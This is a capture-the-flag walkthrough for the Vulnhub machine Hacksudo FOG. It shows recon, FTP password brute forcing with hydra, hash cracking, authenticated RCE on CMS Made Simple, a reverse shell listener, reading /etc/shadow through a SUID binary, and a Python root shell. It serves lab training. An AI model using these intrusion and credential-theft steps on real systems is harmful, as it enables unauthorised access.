---
title: "Hacksudo FOG - Vulnhub CTF Walkthrough"
---
Description:
{% highlight text %}
This box should be easy . This machine was created for the InfoSec Prep Discord Server (https://discord.gg/7ujQrt393b)

The box was created with Virtualbox. Upon booting up use netdiscover tool to find IP address. This is the target address based on whatever settings you have. You should verify the address just incase.

Find the user.txt and root.txt flag submit it to the mybox channel on Discord and get chance to get hacksudo machine hacking course free .

Do publish write ups for this box if you can and email me copy on vishal@hacksudo.com

Box created by vishal Waghmare only
{% endhighlight %}

#### Recon
nmap:
{% highlight terminal %}
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV 192.168.56.213 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 05:08 EDT
Nmap scan report for 192.168.56.213
Host is up (0.00079s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       Pure-FTPd
22/tcp    open  ssh       OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.38 ((Debian))
111/tcp   open  rpcbind   2-4 (RPC #100000)
443/tcp   open  ssl/https Apache/2.4.38 (Debian)
2049/tcp  open  nfs_acl   3 (RPC #100227)
3306/tcp  open  mysql     MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1
36093/tcp open  nlockmgr  1-4 (RPC #100021)
43369/tcp open  mountd    1-3 (RPC #100005)
52545/tcp open  mountd    1-3 (RPC #100005)
54529/tcp open  mountd    1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}


gobuster:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-fog]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -q -x php,txt,html -u http://192.168.56.213/
/index.php            (Status: 302) [Size: 0] [--> /fog/index.php]
/index.html           (Status: 200) [Size: 853]                   
/index1.html          (Status: 200) [Size: 329]                   
/cms                  (Status: 301) [Size: 314] [--> http://192.168.56.213/cms/]
/dict.txt             (Status: 200) [Size: 1798]                                
/fog                  (Status: 301) [Size: 314] [--> http://192.168.56.213/fog/]
{% endhighlight %}

dict.txt is likely a relevant wordlist for the cms let's `wget` it and use it later.

in the comments of the index1.html page:
{% highlight html %}
<!-- caesar-cipher ==? https://github.com/hacksudo/SoundStegno --!>
<!-- box author : hacksudo  --!>
{% endhighlight %}
that could be a clue as to the file exension types to look for with gobuster.

The CMS in use is CMS Made Simple which I'm not too familiar with but browsing around
the index page gives us the user `hacksudo` from the news module.

before we get into exploiting any vulnerabilities with the CMS, lets take a look at
the other services running on the machine:

#### FTP
why not try the `dict.txt` with hydra with the username `hacksudo` 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-fog]
└─$ hydra -l hacksudo -P dict.txt ftp://192.168.56.213
-- SNIP --
[21][ftp] host: 192.168.56.213   login: hacksudo   password: hackme
{% endhighlight %}
after logging in as the user we get the first flag:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-fog]
└─$ cat flag1.txt 
great you done step 1
 ___ ___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  
 / __/ _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \ 
| (_| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | |
 \___\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|
                 |___/                                               

www.hacksudo.com
{% endhighlight %}

Poking around in the directories:
{% highlight terminal %}
drwxr-xr-x    2 0          0                4096 May  6 13:57 hacksudo_ISRO_bak
226-Options: -l 
226 2 matches total
ftp> cd hacksudo_ISRO_bak
250 OK. Current directory is /hacksudo_ISRO_bak
ftp> ls
200 PORT command successful
150 Connecting to port 39979
-rw-r--r--    1 0          0                  63 May  5 11:07 authors.txt
-rw-r--r--    1 0          0                   0 May  6 11:36 installfog
-rw-r--r--    1 0          0             1573833 May  6 19:24 secr3tSteg.zip
{% endhighlight %}

Let's get the `secr3tSteg.zip` and see that it's password protected, so let's use
`zip2john` to then attempt cracking the password with john:

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-fog]
└─$ zip2john secr3tSteg.zip > secr3tSteg.hash                                   1 ⨯
ver 2.0 efh 5455 efh 7875 secr3tSteg.zip/hacksudoSTEGNO.wav PKZIP Encr: 2b chk, TS_chk, cmplen=1573432, decmplen=1965596, crc=8B4A9445
ver 1.0 efh 5455 efh 7875 secr3tSteg.zip/secr3t.txt PKZIP Encr: 2b chk, TS_chk, cmplen=35, decmplen=23, crc=DD73D9B0
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

{% endhighlight %}


{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-fog]
└─$ john secr3tSteg.hash --show
secr3tSteg.zip:fooled::secr3tSteg.zip:secr3t.txt, hacksudoSTEGNO.wav:secr3tSteg.zip

1 password hash cracked, 0 left
{% endhighlight %}

Let's use the tool `SoundStego` mentioned earlier to decipher the message in the WAV
file from the zip archive:

{% highlight text %}
Your Secret Message is: Shift by 3
ABCDEFGHIJKLMNOPQRSTUVWXYZ
DEFGHIJKLMNOPQRSTUVWXYZABC
zzzz.orfdokrvw/irj Xvhuqdph=irj:sdvvzrug=kdfnvxgrLVUR
{% endhighlight %}

The decoded caesar code:
{% highlight text %}
wwww.localhost/fog Username=fog:password=hacksudoISRO
{% endhighlight %}
I managed to log in to the CMS with the credentials, so after I figure out how to 
get a reverse shell, we'll have a foothold. The specific version being used is 2.2.5
which happens to be vulnerable to authenicated remote code execution. 

Using searchsploit to find the exploit: 

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-fog]
└─$ searchsploit CMS Made Simple 2.2.5
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
CMS Made Simple 2.2.5 - (Authenticated) Remote Cod | php/webapps/44976.py
CMS Made Simple < 2.2.10 - SQL Injection           | php/webapps/46635.py
--------------------------------------------------- ---------------------------------
Shellcodes: No Results
{% endhighlight %}

After editing the variables to fit the target installation and reviewing the script
it seems to fail. So I opted to use the method of authenticated RCE used in version
2.2.15 with the path `php/webapps/49345.txt`:

#### Getting a reverse shell

After setting up the listener: 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-fog]
└─$ nc -lvp 6666               
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 192.168.56.213.
Ncat: Connection from 192.168.56.213:46502.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endhighlight %}

#### Local enumeration on the target

Getting the second flag:

{% highlight terminal %}
you successfully crack web and got shell access!!!
                                _         _       _   _             
  ___ ___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  
 / __/ _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \ 
| (_| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | |
 \___\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|
step 2 done.
     _               ____  
 ___| |_ ___ _ __   |___ \ 
/ __| __/ _ \ '_ \    __) |
\__ \ ||  __/ |_) |  / __/ 
|___/\__\___| .__/  |_____|
            |_|            

{% endhighlight %}

etc/passwd:
{% highlight terminal %}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
tftp:x:109:114:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
ftpuser:x:1002:1002::/dev/null:/etc
isro:x:1003:1003:,,,:/home/isro:/bin/bash
dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
{% endhighlight %}

So we have a main user `isro` so maybe we can use hydra with `dict.txt` to get into
that account over SSH. No such luck there. 

SUID bins:
{% highlight terminal %}
www-data@hacksudo:/etc$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/mount.nfs
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/look
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
{% endhighlight %}

`/usr/bin/look` jumps out at me. We can use look to read files on the system as the 
root user so lets read the `/etc/shadow` file:
{% highlight terminal %}
www-data@hacksudo:/etc$ LFILE=/etc/shadow
LFILE=/etc/shadow
www-data@hacksudo:/etc$ look '' "$LFILE"
look '' "$LFILE"
root:$6$zHA6yDSHPcoPX7dX$2oZJxM7gBzhQIT049d4MuR7jAypyZpDPoo6aKQfkJAfJNKF/CgY1GYFCu.Wb5cB6713Zjtzgk.ls0evZ6YToD/:18756:0:99999:7:::
daemon:*:18751:0:99999:7:::
bin:*:18751:0:99999:7:::
sys:*:18751:0:99999:7:::
sync:*:18751:0:99999:7:::
games:*:18751:0:99999:7:::
man:*:18751:0:99999:7:::
lp:*:18751:0:99999:7:::
mail:*:18751:0:99999:7:::
news:*:18751:0:99999:7:::
uucp:*:18751:0:99999:7:::
proxy:*:18751:0:99999:7:::
www-data:*:18751:0:99999:7:::
backup:*:18751:0:99999:7:::
list:*:18751:0:99999:7:::
irc:*:18751:0:99999:7:::
gnats:*:18751:0:99999:7:::
nobody:*:18751:0:99999:7:::
_apt:*:18751:0:99999:7:::
systemd-timesync:*:18751:0:99999:7:::
systemd-network:*:18751:0:99999:7:::
systemd-resolve:*:18751:0:99999:7:::
systemd-coredump:!!:18751::::::
messagebus:*:18751:0:99999:7:::
sshd:*:18751:0:99999:7:::
mysql:!:18751:0:99999:7:::
_rpc:*:18751:0:99999:7:::
statd:*:18751:0:99999:7:::
tftp:*:18751:0:99999:7:::
ftpuser:!:18751:0:99999:7:::
isro:$6$DMdxcRB0fQbGflz2$39vmRyBB0JubEZpJJN13rSzssMQ6t1R6KXLSPjOmpImsyuWqyXHneT8CH0nKr.XDEzKIjt1H3ndbNzirCjOAa/:18756:0:99999:7:::
dnsmasq:*:18756:0:99999:7:::
{% endhighlight %}

Copy the isro user shadow line to a separate file for cracking with john:

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-fog]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt isro-shadow 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty           (isro)
1g 0:00:00:00 DONE (2021-05-27 10:09) 5.555g/s 711.1p/s 711.1c/s 711.1C/s 123456..diamond
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

we can log in over ssh with the credentials `isro:qwerty` and get the user flag:

{% highlight terminal %}
isro@hacksudo:~$ cat user.txt 
8b64d2451b7a8f3fd17390f88ea35917
{% endhighlight %}

`sudo -l` output:
{% highlight terminal %}
isro@hacksudo:~$ sudo -l
[sudo] password for isro: 
Matching Defaults entries for isro on hacksudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User isro may run the following commands on hacksudo:
    (root) /usr/bin/ls /home/isro/*
{% endhighlight %}

Checking the fog directory:
{% highlight terminal %}
isro@hacksudo:~/fog$ ls -asl
total 3700
   4 drwxr-xr-x 2 isro isro    4096 May 13 05:06 .
   4 drwxr-x--- 5 isro isro    4096 May 13 07:28 ..
  20 -rwxr-xr-x 1 root isro   16712 May 12 13:46 fog
   0 -rw-r--r-- 1 isro isro       0 May  6 14:30 get
  68 -rwxr-xr-x 1 isro isro   69368 May  6 14:29 ping
3604 -rwxr-xr-x 1 isro isro 3689352 May  6 14:30 python
{% endhighlight %}

`fog` binary looks interesting. It looks like a custom build of python. We'll use 
this as a means of privilege escalation by spawning a shell:

{% highlight terminal %}
isro@hacksudo:~/fog$ ./fog 
Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty
>>> pty.spawn("/bin/bash")
┌──(root💀hacksudo)-[~/fog]
└─#
{% endhighlight %}

Getting the root flag:
{% highlight terminal %}
┌──(root💀hacksudo)-[/root]
└─# cat root.txt 
         .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.od
b.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
great you rooted hacksudo Fog Box !!!
flag {4356a779ce18252fa1dd2d2b6ab56b19}
submit this flag at hacksudo discord https://discord.gg/vK4NRYt3
{% endhighlight %}
